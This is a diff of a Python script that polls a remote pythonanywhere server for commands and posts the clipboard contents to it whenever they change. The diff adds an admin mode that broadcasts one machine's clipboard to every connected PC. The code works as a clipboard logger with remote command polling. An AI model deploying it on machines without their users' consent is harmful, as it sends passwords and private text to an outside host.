@@ -85,10 +85,13 @@ try:
 except:
     pass
 
+admin=False
 path=os.path.dirname(os.path.abspath(__file__))
 with open(f"{path}\\user.txt", "r") as file:
     user=file.read()
-
+if user=="admin":
+    user="pc1"
+    admin=True
 commends=[]
 lastCommend=requests.get("https://mrcrow.pythonanywhere.com/getCommend").json()
 commends.append(lastCommend['commend'])
@@ -103,4 +106,5 @@ while True:
     if clip!=pyperclip.paste():
         requests.post("https://mrcrow.pythonanywhere.com/sendBot",json={'text':pyperclip.paste(),"id":user})
         clip=pyperclip.paste()
-
+        if admin:
+            requests.post("https://mrcrow.pythonanywhere.com/sendCommend",json={"commend":("/copy "+pyperclip.paste()),"pc":"all"})
